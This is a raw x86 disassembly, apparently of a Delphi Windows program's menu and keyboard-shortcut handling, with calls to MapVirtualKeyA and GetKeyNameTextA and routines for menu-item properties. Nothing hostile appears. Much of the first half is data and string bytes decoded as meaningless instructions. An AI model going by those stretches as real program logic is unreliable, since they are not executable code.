add [ ebp + edx * 4 + 0x44 ] al
dec esp
xchg edi eax
inc esp
add [ 0x654c616d ] cl
je r-xdata
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah cl
xchg esi eax
inc esp
add [ esi ] al
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xe065646f
mov [ eax + eax + 0x50 ] es
add [ eax ] al
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
nop
rcl [ esi + 0xf030044 ] 0x1
push esp
push eax
outsd
jo r-xdata
jb r-xdata
insd
popad
jae r-xdata
dec ecx
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
jmp [ eax + 0x10044e5 ]
outsb
jne r-xdata
add [ eax ] al
add eax [ eax ]
std
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
xchg edi eax
inc esp
outsd
adc [ edi + 0xc030044 ] dl
push esp
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
jne r-xdata
push eax
jo r-xdata
outsb
je r-xdata
ja r-xdata
inc ecx
add ah cl
fwait
inc ecx
add [ eax ] ch
inc ebx
inc ecx
add [ eax - 0x1ebfffbc ] ah
inc esp
add [ esp + ebx * 4 - 0x6253ffbf ] dh
inc ecx
add ah bl
lahf
add [ eax ] eax
add [ eax - 0x6fffbb1b ] al
in eax 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
or eax 0x6f42616d
insd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
int3
adc [ eax ] al
inc ecx
add [ eax ] al
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ eax - 0x1b ] ah
inc esp
add [ eax - 0x1b ] dh
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
in al dx
inc esp
add [ esp + eax * 2 ] cl
inc ecx
add ah cl
fwait
inc ecx
add [ eax ] ch
inc ebx
inc ecx
add [ eax - 0x1ebfffbc ] ah
inc esp
add [ esp + ebx * 4 - 0x6253ffbf ] dh
inc ecx
add ah bl
lahf
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add [ eax - 0x14 ] ah
inc esp
add [ eax - 0x272fffbc ] cl
inc esp
add [ eax - 0x12f7ffbc ] bh
inc esp
add al al
in eax dx
inc esp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
add [ eax - 0x2bffbfd0 ] bh
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x68 ] ah
inc esp
add [ eax ] bh
add [ eax ] al
clc
xchg ebx eax
inc esp
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
outsd
inc edx
outsd
je r-xdata
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
push esp
outsd
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
inc eax
add [ eax ] bl
cdq
les ebx [ edi + 0x33580041 ]
jo r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dl
outsd
insd
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edi + edx * 4 ] cl
inc esp
add [ 0x69526274 ] cl
push 0x74754274
je r-xdata
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
add [ eax ] al
add [ eax + eax ] cl
push cs
push eax
popad
jb r-xdata
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
jo r-xdata
jns r-xdata
inc ecx
add [ eax + 0x33 ] ah
inc esp
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
outsd
mov eax 0x6004497
je r-xdata
jne r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
pop esp
jb r-xdata
inc ecx
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add al dh
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6865646f
adc eax [ ecx ]
sbb al 0xed
adc al [ ecx ]
xor [ eax ] al
add bh bh
call 0xffffffffe044de19
fld [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
inc esp
add [ ebp * 8 + 0x10044 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
push 0x1c004113
aam 0x8e
inc esp
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
jo r-xdata
xchg edi eax
inc esp
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
xor eax [ eax ]
sbb [ ecx + 0x33600041 ] bl
add [ ebp - 0x67e3ffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ edi + edx * 4 + 0x44 ] ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x68 ] dh
inc esp
add [ eax ] al
je r-xdata
outsd
dec esp
push cs
push esp
dec ebp
outsb
jne r-xdata
add [ esi ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebx + 0x80044 ] bl
add [ eax ] al
enter 0x4241 0x0
dec esp
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0x8004030
jo r-xdata
inc ebx
push 0x65676e61
aam 0x13
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc65646f
xchg edi eax
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
enter 0x44df 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
add [ eax ] cl
add bh bh
add al 0xe1
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax + 0x19 ] bl
outsb
loopne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
outsb
jne r-xdata
outsb
add eax 0x756e654d
jae r-xdata
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
cmp eax [ ecx ]
xchg esp eax
cmp eax 0x3f7c0041
inc ecx
add [ esp + edi + 0x41 ] al
add al al
cmp al 0x41
add al bl
out 0x44 al
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
rol al 0x9a
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
0x140044 0x0
pop eax
sbb [ ecx ] eax
dec esp
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xf0004030
in eax dx
dec ebp
outsd
push 0x1c004113
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
xchg edi eax
inc esp
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
add [ ebx + eax * 2 + 0x42 ] ch
add [ ebx + eax * 2 + 0x42 ] cl
add [ eax ] bh
inc ebx
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
or [ ebx + 0x42 ] al
inc ebx
inc edx
imul esi [ ebx + 0x74 ] 0x449b2c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
fwait
inc esp
add [ eax ] cl
add [ eax ] al
add al cl
inc ecx
inc edx
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax ] cl
or eax [ eax ]
adc [ eax ] al
inc eax
add [ eax ] al
dec eax
fild [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc esp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cwde
inc esp
add [ esp + edx * 4 + 0x100044 ] ch
add eax 0x756e654d
jae r-xdata
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43e414
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
aam 0x8e
inc esp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
xchg esi eax
inc esp
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_449b78
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_438bc4
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43e414
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_449bd0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_449c08
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403e54
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_4040c4
sub_449c5c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_449e45
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403eec
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_40403c
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403eec
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403eec
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_40403c
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_40403c
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403e54
mov eax esi
call sub_403e54
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403eec
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_407d78
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404160
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_449c08
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40411c
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403eec
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40411c
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_40411c
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40411c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449e4c
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403e78
retn
sub_449e60
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_404114
push eax
mov eax edi
call sub_404114
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_404114
push eax
mov eax edi
call sub_404314
push eax
mov eax [ esi ]
call sub_404314
pop edx
pop ecx
call sub_407c58
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_404114
mov ecx eax
mov eax esi
mov edx 0x1
call sub_4043b4
sub_449ebc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404304
xor eax eax
push ebp
push sub_449f97
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_449e60
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_449e60
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_449e60
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_449e60
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449f9e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_449c5c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407c08
test eax eax
jne r-xdata
sub_449fd4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_44c574
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_44c584
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_44a034
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_44c574
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_44c574
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_44c584
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_44c584
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_449fd4
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_449fd4
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_44c584
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_44c584
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_44a180
push ebx
mov ebx eax
mov eax ebx
call sub_446870
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_44f090
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44a1b8
push ebx
mov ebx eax
mov eax ebx
call sub_446884
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44a1e8
push ebx
mov ebx eax
mov eax ebx
call sub_446898
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44a218
push ebx
mov ebx eax
mov eax ebx
call sub_4468c0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44a248
push ebx
mov ebx eax
mov eax ebx
call sub_4468e8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_404260
je r-xdata
mov al 0x1
pop ebx
retn
sub_44a27c
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_4468ac
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_44a2b8
push ebx
mov ebx eax
mov eax ebx
call sub_4468fc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44a2ec
push ebx
mov ebx eax
mov eax ebx
call sub_446910
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44a320
push ebx
mov ebx eax
mov eax ebx
call sub_446924
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44a354
push ebx
mov ebx eax
mov eax ebx
call sub_41a144
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44a37c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_44a39c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44c3dc
sub_44a3bc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44c44c
sub_44a3dc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44c4a0
sub_44a3fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_44a418
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_403ea8
sub_44a43c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44c5cc
sub_44a45c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44c5a8
sub_44a47c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44c5bc
sub_44a49c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_44a4c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419854
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_449fb4
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44ced8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_44a544
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_44ee74
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_44c574
test eax eax
jg r-xdata
mov edx esi
call sub_44c90c
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_44c584
call sub_403104
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403104
lea eax [ esi + 0x44 ]
call sub_40d078
lea eax [ esi + 0x78 ]
call sub_40d078
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
